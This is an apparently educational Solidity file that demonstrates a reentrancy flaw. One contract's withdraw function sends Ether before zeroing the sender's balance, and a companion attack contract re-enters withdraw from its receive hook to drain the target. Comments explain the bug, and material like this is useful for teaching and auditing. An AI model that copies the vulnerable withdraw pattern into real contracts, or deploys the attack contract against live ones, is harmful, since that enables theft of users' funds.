// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/// @title ReEntrancyContract
/// @notice A contract that allows users to deposit and withdraw funds, demonstrating a reentrancy vulnerability.
contract ReEntrancyContract {
    mapping(address => uint) private balances;

    /// @notice Deposits Ether into the sender's account.
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    /// @notice Withdraws the sender's balance from their account.
    function withdraw() external {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "Insufficient balance");

        // Reentrancy vulnerability: The `withdraw` function is susceptible to reentrancy attacks.
        // The contract transfers Ether to the sender before updating the balance.
        // An attacker can call this function repeatedly, re-entering the function and re-draining the contract's balance.
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    /// @notice Returns the balance of the contract.
    /// @return The balance of the contract.
    function getContractBalance() external view returns (uint) {
        return address(this).balance;
    }
}

/// @title ReEntrancyAttack
/// @notice A contract representing an attack on the ReEntrancyContract contract.
contract ReEntrancyAttack {
    ReEntrancyContract public target;

    /// @notice Constructs the ReEntrancyAttack contract, specifying the target contract.
    /// @param _target The address of the ReEntrancyContract contract to attack.
    constructor(address _target) {
        target = ReEntrancyContract(_target);
    }

    /// @notice Receives Ether sent to the contract.
    receive() external payable {
        if (address(target).balance >= 1 ether) {
            target.withdraw();
        }
    }

    /// @notice Initiates the attack on the target contract.
    function attack() external payable {
        require(msg.value >= 1 ether, "Require 1 Ether to attack");

        // The attack starts by depositing 1 Ether into the target contract.
        target.deposit{value: 1 ether}();

        // Then, the attacker calls the target contract's `withdraw` function, triggering the reentrancy vulnerability.
        target.withdraw();
    }

    /// @notice Returns the balance of the attack contract.
    /// @return The balance of the attack contract.
    function getContractBalance() public view returns (uint) {
        return address(this).balance;
    }
}
